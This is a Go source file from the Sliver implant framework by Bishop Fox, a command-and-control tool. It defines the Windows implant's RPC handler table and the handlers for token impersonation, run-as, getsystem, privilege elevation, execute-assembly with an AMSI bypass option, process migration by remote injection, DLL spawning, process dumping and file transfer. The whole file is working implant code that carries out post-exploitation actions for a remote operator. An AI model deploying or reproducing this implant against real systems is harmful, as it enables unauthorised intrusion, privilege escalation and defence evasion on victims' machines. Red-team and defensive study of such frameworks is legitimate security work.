package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Debug}}
	"log"
	// {{else}}{{end}}

	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/sliver/priv"
	"github.com/bishopfox/sliver/sliver/taskrunner"

	"github.com/golang/protobuf/proto"
	"golang.org/x/sys/windows"
)

var (
	windowsHandlers = map[uint32]RPCHandler{
		// Windows Only
		sliverpb.MsgTaskReq:            taskHandler,
		sliverpb.MsgRemoteTaskReq:      remoteTaskHandler,
		sliverpb.MsgProcessDumpReq:     dumpHandler,
		sliverpb.MsgImpersonateReq:     impersonateHandler,
		sliverpb.MsgRevToSelf:          revToSelfHandler,
		sliverpb.MsgRunAsReq:           runAsHandler,
		sliverpb.MsgInvokeGetSystemReq: getsystemHandler,
		sliverpb.MsgElevateReq:         elevateHandler,
		sliverpb.MsgExecuteAssemblyReq: executeAssemblyHandler,
		sliverpb.MsgInvokeMigrateReq:   migrateHandler,
		sliverpb.MsgSpawnDllReq:        spawnDllHandler,

		// Generic
		sliverpb.MsgPsReq:       psHandler,
		sliverpb.MsgTerminate:   terminateHandler,
		sliverpb.MsgPing:        pingHandler,
		sliverpb.MsgLsReq:       dirListHandler,
		sliverpb.MsgDownloadReq: downloadHandler,
		sliverpb.MsgUploadReq:   uploadHandler,
		sliverpb.MsgCdReq:       cdHandler,
		sliverpb.MsgPwdReq:      pwdHandler,
		sliverpb.MsgRmReq:       rmHandler,
		sliverpb.MsgMkdirReq:    mkdirHandler,
		sliverpb.MsgIfconfigReq: ifconfigHandler,
		sliverpb.MsgExecuteReq:  executeHandler,

		sliverpb.MsgScreenshotReq: screenshotHandler,

		sliverpb.MsgSideloadReq: sideloadHandler,
		sliverpb.MsgNetstatReq:  netstatHandler,
	}
)

func GetSystemHandlers() map[uint32]RPCHandler {
	return windowsHandlers
}

// ---------------- Windows Handlers ----------------

func impersonateHandler(data []byte, resp RPCResponse) {
	impersonateReq := &sliverpb.ImpersonateReq{}
	err := proto.Unmarshal(data, impersonateReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	token, err := priv.Impersonate(impersonateReq.Username)
	if err == nil {
		taskrunner.CurrentToken = token
	}
	impersonate := &sliverpb.Impersonate{}
	if err != nil {
		impersonate.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(impersonate)
	resp(data, err)
}

func runAsHandler(data []byte, resp RPCResponse) {
	runAsReq := &sliverpb.RunAsReq{}
	err := proto.Unmarshal(data, runAsReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	out, err := priv.RunProcessAsUser(runAsReq.Username, runAsReq.ProcessName, runAsReq.Args)
	runAs := &sliverpb.RunAs{
		Output: out,
	}
	if err != nil {
		runAs.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(runAs)
	resp(data, err)
}

func revToSelfHandler(_ []byte, resp RPCResponse) {
	//{{if .Debug}}
	log.Println("Calling revToSelf...")
	//{{end}}
	taskrunner.CurrentToken = windows.Token(0)
	err := priv.RevertToSelf()
	revToSelf := &sliverpb.RevToSelf{}
	if err != nil {
		revToSelf.Response = &commonpb.Response{Err: err.Error()}
	}
	//{{if .Debug}}
	log.Println("revToSelf done!")
	//{{end}}
	data, err := proto.Marshal(revToSelf)
	resp(data, err)
}

func getsystemHandler(data []byte, resp RPCResponse) {
	getSysReq := &sliverpb.InvokeGetSystemReq{}
	err := proto.Unmarshal(data, getSysReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = priv.GetSystem(getSysReq.Data, getSysReq.HostingProcess)
	getSys := &sliverpb.GetSystem{}
	if err != nil {
		getSys.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(getSys)
	resp(data, err)
}

func elevateHandler(data []byte, resp RPCResponse) {
	elevateReq := &sliverpb.ElevateReq{}
	err := proto.Unmarshal(data, elevateReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = priv.Elevate()
	elevate := &sliverpb.Elevate{
		Success: err == nil,
	}
	if err != nil {
		elevate.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(elevate)
	resp(data, err)
}

func executeAssemblyHandler(data []byte, resp RPCResponse) {
	//{{if .Debug}}
	log.Println("executeAssemblyHandler called")
	//{{end}}
	execReq := &sliverpb.ExecuteAssemblyReq{}
	err := proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	output, err := taskrunner.ExecuteAssembly(execReq.HostingDll, execReq.Assembly, execReq.Process, execReq.Arguments, execReq.AmsiBypass)
	execAsm := &sliverpb.ExecuteAssembly{Output: output}
	if err != nil {
		execAsm.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(execAsm)
	resp(data, err)

}

func migrateHandler(data []byte, resp RPCResponse) {
	// {{if .Debug}}
	log.Println("migrateHandler: RemoteTask called")
	// {{end}}
	migrateReq := &sliverpb.InvokeMigrateReq{}
	err := proto.Unmarshal(data, migrateReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
	// {{if .Debug}}
	log.Println("migrateHandler: RemoteTask called")
	// {{end}}
	migrateResp := &sliverpb.Migrate{Success: true}
	if err != nil {
		migrateResp.Success = false
		migrateResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
		// {{if .Debug}}
		log.Println("migrateHandler: RemoteTask failed:", err)
		// {{end}}
	}
	data, err = proto.Marshal(migrateResp)
	resp(data, err)
}

func spawnDllHandler(data []byte, resp RPCResponse) {
	spawnReq := &sliverpb.SpawnDllReq{}
	err := proto.Unmarshal(data, spawnReq)

	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	//{{if .Debug}}
	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.ProcName, spawnReq.Offset, spawnReq.Args)
	//{{end}}
	result, err := taskrunner.SpawnDll(spawnReq.ProcName, spawnReq.Data, spawnReq.Offset, spawnReq.Args)
	spawnResp := &sliverpb.SpawnDll{Result: result}
	if err != nil {
		spawnResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}

	data, err = proto.Marshal(spawnResp)
	resp(data, err)
}
